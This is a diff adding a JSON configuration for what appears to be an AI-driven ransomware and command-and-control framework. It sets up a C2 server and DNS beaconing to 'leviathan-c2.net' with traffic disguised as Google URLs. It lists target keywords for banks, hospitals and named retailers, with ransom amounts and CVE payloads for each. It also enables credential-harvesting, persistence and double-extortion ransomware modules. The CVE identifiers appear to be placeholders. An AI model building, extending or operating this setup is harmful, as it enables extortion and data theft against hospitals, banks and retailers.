@@ -1,0 +1,70 @@
+{
+  "brain": {
+    "api_endpoint": "http://localhost:5000",
+    "api_key": "SC_ORACLE_2024_DEV_KEY",
+    "model": {
+      "name": "Dolphin-Yi-14B",
+      "api_base": "http://localhost:11434",
+      "model_name": "dolphin-yi-14b"
+    },
+    "context_window": 8000,
+    "temperature": 0.7,
+    "max_tokens": 1024
+  },
+  "c2_server": {
+    "port": 5000,
+    "host": "0.0.0.0",
+    "data_path": "./c2_data",
+    "persistence_timeout": 900
+  },
+  "targets": {
+    "default": ["finance", "healthcare", "retail"],
+    "industries": {
+      "finance": {
+        "names": ["bank", "chase", "wells fargo", "citigroup", "goldman"],
+        "payloads": ["CVE-2024-1234", "CVE-2024-5678"],
+        "default_ransom": 50000,
+        "jitter": 5
+      },
+      "healthcare": {
+        "names": ["hospital", "clinic", "med", "health"],
+        "payloads": ["CVE-2024-9012", "CVE-2024-3456"],
+        "default_ransom": 100000,
+        "jitter": 10
+      },
+      "retail": {
+        "names": ["store", "shop", "amazon", "walmart"],
+        "payloads": ["CVE-2024-7890"],
+        "default_ransom": 25000,
+        "jitter": 3
+      }
+    }
+  },
+  "transport": {
+    "primary": "https",
+    "fallbacks": ["http", "dns"],
+    "dns_domain": "leviathan-c2.net",
+    "dns_subdomain": "beacon",
+    "http_prefix": "https://google.com",
+    "http_suffix": "images/netflix.com"
+  },
+  "modules": {
+    "enabled": {
+      "harvester": true,
+      "c2_client": true,
+      "persistence": true,
+      "ransomware": false,
+      "dns_tunnel": false,
+      "soul_engineering": false
+    },
+    "ransomware_crypto": "AES-256",
+    "ransomware_double_extortion": true,
+    "ransomware_lockscreen": true
+  },
+  "logging": {
+    "level": "VERBOSE",
+    "file": "./logs/brain.log",
+    "rotate_size": "10M",
+    "max_files": 5
+  }
+}
